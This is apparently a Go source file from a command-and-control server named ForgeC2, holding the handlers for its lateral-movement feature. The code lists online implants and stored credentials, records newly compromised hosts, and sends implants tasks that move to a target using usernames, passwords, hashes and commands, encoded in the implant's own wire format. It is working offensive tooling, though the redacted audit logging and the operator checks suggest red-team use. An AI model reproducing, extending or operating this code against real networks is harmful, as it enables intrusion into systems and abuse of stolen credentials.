package server

import (
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

// handleLateralPage renders the lateral movement page
func (s *Server) handleLateralPage(c *gin.Context) {
	stats := s.getNavStats(c)

	// Get available agents
	var agents []db.Implant
	if err := s.db.Where("status = 'online'").Order("last_seen desc").Limit(5000).Find(&agents).Error; err != nil {
		slog.Error("Failed to query lateral agents", "err", err)
	}

	// Get credentials from vault
	var credentials []db.CredentialEntry
	if err := s.db.Order("created_at desc").Limit(50).Find(&credentials).Error; err != nil {
		slog.Error("Failed to query lateral credentials", "err", err)
	}

	// Get statistics
	var onlineAgents int64
	if err := s.db.Model(&db.Implant{}).Where("status = 'online'").Count(&onlineAgents).Error; err != nil {
		slog.Error("Failed to count online agents", "err", err)
	}

	var totalCreds int64
	if err := s.db.Model(&db.CredentialEntry{}).Count(&totalCreds).Error; err != nil {
		slog.Error("Failed to count credentials", "err", err)
	}

	var totalTasks int64
	if err := s.db.Model(&db.Task{}).Where("type = 'lateral'").Count(&totalTasks).Error; err != nil {
		slog.Error("Failed to count lateral tasks", "err", err)
	}

	data := gin.H{
		"Title":        "ForgeC2 - Lateral Movement",
		"ActiveNav":    "lateral",
		"Stats":        stats,
		"Agents":       agents,
		"Credentials":  credentials,
		"OnlineAgents": onlineAgents,
		"TotalCreds":   totalCreds,
		"TotalTasks":   totalTasks,
	}
	s.renderPageOrJSON(c, data)
}

// handleLateralHistory returns lateral movement history
func (s *Server) handleLateralHistory(c *gin.Context) {
	agentID := c.Param("id")

	var tasks []db.Task
	q := s.db.Where("type = 'lateral'")
	if agentID != "all" {
		q = q.Where("agent_id = ?", agentID)
	}
	q.Order("created_at desc").Limit(50).Find(&tasks)

	// Real total: the 50-row cap made the stats card report ≤50 forever.
	var total int64
	countQ := s.db.Model(&db.Task{}).Where("type = 'lateral'")
	if agentID != "all" {
		countQ = countQ.Where("agent_id = ?", agentID)
	}
	countQ.Count(&total)

	respond(c, gin.H{
		"tasks": tasks,
		"total": total,
	})
}

// handleProcessLateralResult processes lateral movement results from agent
func (s *Server) handleProcessLateralResult(c *gin.Context) {
	var req struct {
		TaskID  uint   `json:"task_id"`
		AgentID string `json:"agent_id"`
		Success bool   `json:"success"`
		Output  string `json:"output"`
		Error   string `json:"error"`
		Target  string `json:"target"`
		Method  string `json:"method"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}

	// Update task
	updates := map[string]interface{}{
		"status": "completed",
		"result": req.Output,
	}

	if !req.Success {
		updates["status"] = "failed"
		updates["error"] = req.Error
	}

	if err := s.db.Model(&db.Task{}).Where("id = ?", req.TaskID).Updates(updates).Error; err != nil {
		slog.Error("Failed to update lateral task", "task_id", req.TaskID, "err", err)
	}

	// If successful, add target to network hosts
	if req.Success && req.Target != "" {
		host := db.NetworkHost{
			AgentID:  req.AgentID,
			IP:       req.Target,
			Hostname: "",
			OS:       "",
			Services: fmt.Sprintf(`[{"method":"%s","port":0}]`, req.Method),
			LastSeen: time.Now(),
		}
		if err := s.db.Where("agent_id = ? AND ip = ?", req.AgentID, req.Target).FirstOrCreate(&host, db.NetworkHost{
			AgentID: req.AgentID,
			IP:      req.Target,
		}).Error; err != nil {
			slog.Error("Failed to create network host from lateral result", "err", err)
		}
	}

	respond(c, gin.H{})
}

type lateralSpec struct {
	Source     string `json:"source"`
	Target     string `json:"target"`
	Method     string `json:"method"`
	Credential string `json:"credential,omitempty"`
	Username   string `json:"username,omitempty"`
	Password   string `json:"password,omitempty"`
	Command    string `json:"command,omitempty"`
	Hash       string `json:"hash,omitempty"`
	KeyPath    string `json:"key_path,omitempty"`
	Port       string `json:"port,omitempty"`
	Share      string `json:"share,omitempty"`
	Namespace  string `json:"namespace,omitempty"`
	Pivot      string `json:"pivot,omitempty"`
}

// lateralAuditSummary renders a redacted summary of a lateral-movement spec
// for logs and the tamper-evident audit chain. Credential material
// (password/hash/credential/key_path/pivot) is never written to either sink.
//
// It accepts either wire format: the pipe form the implant parses
// ("type|target|user|pass|cmd") and a JSON object (the API form). Only the
// leading identifying fields are echoed; the password slot and the command are
// always dropped.
func lateralAuditSummary(spec string) string {
	if strings.TrimSpace(spec) == "" {
		return "lateral movement"
	}
	trimmed := strings.TrimSpace(spec)
	var method, target, user string
	if strings.HasPrefix(trimmed, "{") {
		var m map[string]interface{}
		if err := json.Unmarshal([]byte(trimmed), &m); err == nil {
			method, _ = m["method"].(string)
			target, _ = m["target"].(string)
			user, _ = m["username"].(string)
		} else {
			return fmt.Sprintf("lateral movement (spec %d bytes)", len(spec))
		}
	} else {
		parts := strings.SplitN(trimmed, "|", 5)
		if len(parts) < 3 {
			return fmt.Sprintf("lateral movement (spec %d bytes)", len(spec))
		}
		method, target, user = parts[0], parts[1], parts[2]
		// parts[3] is the password and parts[4] the command; both stay out.
	}
	method = strings.ToLower(strings.TrimSpace(method))
	target = strings.TrimSpace(target)
	user = strings.TrimSpace(user)
	if method == "" {
		method = "unknown"
	}
	return fmt.Sprintf("lateral movement: method=%s target=%s username=%s", method, target, user)
}

// encodeLateralSpec renders the wire format the implant parses:
// "type|target|user|pass|cmd" (internal/payload/agent/agent_windows.go,
// lateralMove). It was previously sent as JSON, which the agent could never
// parse — strings.SplitN on "|" yields one part, so every lateral task failed
// with "format: type|target|user|pass|cmd".
//
// The implant splits with SplitN(..., 5), so the command may safely contain
// pipes; the fields before it may not, or they would shift the parse.
func encodeLateralSpec(req lateralSpec) (string, error) {
	for name, v := range map[string]string{
		"method": req.Method, "target": req.Target,
		"username": req.Username, "password": req.Password,
	} {
		if strings.Contains(v, "|") {
			return "", fmt.Errorf("%s must not contain '|'", name)
		}
	}
	cmd := strings.TrimSpace(req.Command)
	if cmd == "" {
		cmd = "whoami" // matches the implant's own default
	}
	return strings.Join([]string{
		strings.ToLower(strings.TrimSpace(req.Method)),
		strings.TrimSpace(req.Target),
		strings.TrimSpace(req.Username),
		req.Password,
		cmd,
	}, "|"), nil
}

// handleAPILateralExecute dispatches a lateral movement task via JSON API
func (s *Server) handleAPILateralExecute(c *gin.Context) {
	if !s.requireOperator(c) {
		return
	}
	var req lateralSpec
	if err := c.ShouldBindJSON(&req); err != nil {
		respondError(c, http.StatusBadRequest, "invalid request")
		return
	}
	if req.Source == "" || req.Target == "" || req.Method == "" {
		respondError(c, http.StatusBadRequest, "source, target and method required")
		return
	}
	// The implant has no pivot slot, so accepting one would let the operator
	// believe traffic is tunnelled through an agent they chose when it is not.
	if strings.TrimSpace(req.Pivot) != "" {
		respondError(c, http.StatusBadRequest, "pivot is not supported by the implant")
		return
	}
	spec, err := encodeLateralSpec(req)
	if err != nil {
		respondError(c, http.StatusBadRequest, err.Error())
		return
	}
	task := s.issueAgentTask(c, req.Source, TaskSpec{Type: "lateral", Command: spec})
	if task == nil {
		return // issueAgentTask already responded: 404 (wrong tenant), 409 (locked) or 400
	}
	slog.Info("Lateral movement via JSON API", "agent_id", req.Source, "target", req.Target, "method", req.Method)
	s.LogAuditRecord(c, "lateral", "agent", req.Source, lateralAuditSummary(spec), true, nil)
	s.broadcastTaskUpdate(req.Source, *task)
	respond(c, gin.H{"task_id": task.ID})
}
